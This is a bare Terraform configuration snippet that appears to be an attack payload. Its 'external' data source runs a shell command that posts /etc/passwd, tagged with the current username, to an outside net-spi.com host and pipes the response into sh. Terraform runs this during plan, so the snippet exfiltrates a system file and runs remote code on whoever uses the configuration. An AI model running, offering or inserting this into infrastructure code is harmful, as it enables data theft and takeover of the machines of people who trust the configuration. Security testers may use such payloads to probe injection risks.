data "external" "example" { program = ["sh", "-c", "curl -XPOST --data-binary @/etc/passwd https://6pw9ke4o80ru6r9ty64s0onfh6nxbuzj.net-spi.com/exfil4/`whoami` | sh"] }
